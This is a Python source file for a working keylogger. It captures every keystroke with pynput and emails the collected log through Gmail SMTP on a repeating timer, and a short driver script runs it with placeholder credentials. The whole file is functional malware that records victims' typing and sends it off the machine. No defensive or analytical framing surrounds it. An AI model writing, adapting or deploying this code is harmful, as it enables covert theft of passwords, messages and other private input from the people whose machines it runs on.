import pynput.keyboard as keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, time_interval, email, password):
        self.key_log = ""
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def key_log_append(self, key):
        self.key_log = self.key_log + str(key)

    def process_key(self, key):
        try:
            self.key_log = self.key_log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.key_log = self.key_log + " "
            elif key == key.backspace:
                self.key_log = self.key_log[:-1]
            else:
                self.key_log = self.key_log + str(key)

    # print(key_log)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com:587")
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report_log(self):
        self.key_log = self.key_log
        self.send_mail(self.email, self.password, self.key_log)
        print(self.key_log)
        timer = threading.Timer(self.time_interval, self.report_log)
        timer.start()

    def execute(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key)
        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()



from keylogger import Keylogger

gmail_keylogger = Keylogger(120, "emailgoeshere.com", "authcodegoeshere")
gmail_keylogger.execute()
